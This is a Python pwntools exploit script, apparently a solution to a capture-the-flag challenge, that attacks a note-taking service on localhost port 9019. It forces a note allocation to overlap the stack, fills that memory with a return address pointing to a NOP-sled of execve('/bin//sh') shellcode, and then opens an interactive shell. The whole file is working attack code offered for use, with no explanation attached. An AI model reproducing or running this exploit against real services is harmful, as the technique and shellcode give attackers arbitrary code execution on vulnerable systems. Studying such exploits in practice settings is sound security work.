from pwn import *

def create_note(conn):
    conn.recvuntil('5. exit')
    conn.sendline('1')
    conn.recvuntil('note created. no ')   
    no = conn.recvline()[0:-1]
    conn.recvuntil('[')
    return (int(no), int(conn.recvuntil(']')[0:-1], 16))
    
def write_note(conn, no, payload):
    conn.recvuntil('5. exit')
    conn.sendline('2')
    conn.recvuntil('note no?')
    conn.sendline(str(no))
    conn.recvuntil('4096 byte)')
    conn.sendline(payload)

def read_note(conn, no):
    conn.recvuntil('5. exit')
    conn.sendline('3')
    conn.recvuntil('note no?')
    conn.sendline(str(no))
    conn.recvline()
    return conn.recvline()

def delete_note(conn, no):
    conn.recvuntil('5. exit')
    conn.sendline('4')
    conn.recvuntil('note no?')
    conn.sendline(str(no))

def exit_ret(conn):
    conn.recvuntil('5. exit')
    conn.sendline('5')

def secret(conn, payload):
    conn.recvuntil('5. exit')
    conn.sendline(str(0x31337))
    conn.recvuntil('this')
    conn.sendline(payload)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

def exp():
    conn    = remote('127.0.0.1', 9019)
    mem     = create_note(conn)
    while mem[1] > 0xf0000000:
        delete_note(conn, mem[0])
        mem = create_note(conn)
    write_note(conn, mem[0], shellcode.rjust(0x100, '\x90'))
    
    # stack expansion
    for i in range (0, 0x1000):
        secret(conn, 'A' * 0x400)
        print "[-] stack expansion  :" + str(i)
    
    mem1 = create_note(conn)
    while (mem1[1] < 0xffd60000) or (mem[1] > 0xffffd000):
        delete_note(conn, mem1[0])
        mem1    = create_note(conn)
        note    = read_note(conn, mem1[0])
        print "[-] memory address   : " + hex(mem1[1])
        print "[-] note             : " + note.encode('hex') + '\n'
        if (mem1[1] >= 0xf7ffc000) and (mem1[1] < 0xffd60000):
            if note != '\x0a':
                break
    
    payload = p32(mem[1]) * (0x1000/4-1)
    print '\n-------------find it-------------------'
    print '[+] write to     :   ' + hex(mem1[1])
    print '[+] with payload :   ' + payload.encode('hex')
    write_note(conn, mem1[0], payload)
    
    exit_ret(conn)
    conn.interactive()

while True:
    exp()

